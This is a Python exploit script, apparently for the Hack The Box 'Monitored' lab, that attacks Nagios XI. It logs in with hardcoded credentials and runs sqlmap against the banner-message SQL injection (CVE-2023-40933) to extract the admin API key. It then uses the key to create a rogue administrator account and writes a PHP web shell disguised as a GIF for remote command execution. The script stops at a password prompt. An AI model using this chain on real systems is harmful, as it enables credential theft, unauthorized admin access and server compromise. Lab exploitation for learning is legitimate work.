#! /usr/bin/env python3

import requests
import re
from colorama import Fore,Back,Style
import sys
import os
from PIL import Image
import random
import subprocess

url="https://nagios.monitored.htb/nagiosxi/"
user="svc"
password="XjH7VCehowpR1xZB"
sqli_url="https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3"
admin_api_url="https://nagios.monitored.htb/nagiosxi/api/v1/system/user"

fnb = random.randint(10, 10000)

new_user="user"+str(fnb)
new_password="password"
changed_pwd="p@ssword"
new_mail=new_user+"@localhost"
new_name=new_user


session = requests.session() #On prépare la session
requests.packages.urllib3.disable_warnings()
print(Fore.BLUE+'[*] Connecting to server...'+Style.RESET_ALL)
r = session.post(url+"api/v1/authenticate", data={'username': user, 'password': password}, verify=False) #On se connecte au serveur
j=r.json()
print(Fore.BLUE+'[*] Authentication...'+Style.RESET_ALL)
token=j['auth_token'] #On récupère le "auth_token"
print(Fore.GREEN+'[*] Token : '+token+Style.RESET_ALL)

#Le token n'est valide que durant 5 minutes. Il nous faut donc récupérer un vrai cookie.
requests.packages.urllib3.disable_warnings()
print(Fore.BLUE+'[*] Getting cookie...'+Style.RESET_ALL)
r=session.get(url+"login.php?token="+token, verify=False)
#print(r.text)
ret=r.cookies.get_dict()
user_cookie=ret['nagiosxi'] #On a récupéré la valeur du cookie, plus aucune limitation de temps. 
print(Fore.GREEN+'[*] Cookie : '+user_cookie+Style.RESET_ALL)

# On va lancer sqlmap pour un scan du paramètre "id"
# SQL Injection in Announcement Banner Settings (CVE-2023-40933)
print(Fore.BLUE+'[*] SQL Injection in Announcement Banner Settings (CVE-2023-40933)'+Style.RESET_ALL)
print(Fore.BLUE+Back.WHITE+"[*] Can take 5 minuts or more..."+Style.RESET_ALL)
print(Fore.BLUE+'[*] Launching sqlmap...'+Style.RESET_ALL)
p = subprocess.run('sqlmap --flush-session --batch -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3" --cookie="nagiosxi='+user_cookie+'" --method POST --data="id=1"-D nagiosxi -T xi_users --drop-set-cookie --technique=ET --dbms=MySQL -p id --risk=3 --level=5 --threads=5 --search "api_key" | tee dumper.txt', shell=True, capture_output=True,text=True)

with open('dumper.txt', 'r') as file:
    for ligne in file:
        if "admin@monitored.htb" in ligne:
            # Rechercher la chaîne de 64 caractères dans cette ligne
            correspondance_api = re.search(r'([A-Za-z0-9]{64})', ligne)
            
            if correspondance_api:
                api_key = correspondance_api.group(1)
                break  # Arrêter la recherche après la première correspondance

if not correspondance_api:
    print("La valeur de api_key pour l'admin n'a pas été trouvée dans le fichier.")
    sys.exit()


#api=re.search(r'([A-Za-z0-9]{64})',p.stdout)
#api_key=str(api.group(0))
print(Fore.GREEN+'[*] API key : '+api_key+Style.RESET_ALL)

# On a récupérer la clé API, on va créer notre propre user administrator
# on construit la requete
print(Fore.BLUE+'[*] Creating new user...'+Style.RESET_ALL)
r=session.post(admin_api_url, data={'username': new_user, 'password': new_password,'email':new_mail,'name':new_name,'auth_level':'admin', 'apikey': api_key}, verify=False)
#print(r.text)
if "successfully" in r.text:
    print(Fore.GREEN+'[*] User created : '+new_user+' with password : '+new_password+Style.RESET_ALL)
else:
    print(Fore.RED+'[*] User not created'+Style.RESET_ALL)
    print(r.text)
    sys.exit()


print(Fore.BLUE + '[*] JPG creation...' + Style.RESET_ALL)
im = Image.new('RGB', (1, 1))
im.save('first.jpg')
print(Fore.GREEN + '[*] JPG "first.jpg" created' + Style.RESET_ALL)

print(Fore.BLUE + '[*] RCE GIF (with Magic Byte "GIF87A") creation' + Style.RESET_ALL)
with open('rev.gif.php',"w") as f:
    f.write("GIF87A\n<?php system($_GET['cmd']);?>")
    #f.save("rev.gif.php")
    f.close()
print(Fore.GREEN + '[*] GIF "rev.gif.php" created' + Style.RESET_ALL)
print(Fore.CYAN + '[1] Login to https://nagios.monitored.htb with the given credentials' + Style.RESET_ALL)
print(Fore.CYAN + '[2] Accept EULA and change the password as required' + Style.RESET_ALL)
print(Fore.CYAN + '[3] When finish, write your new password here:'+Style.RESET_ALL)
last_pass=input()

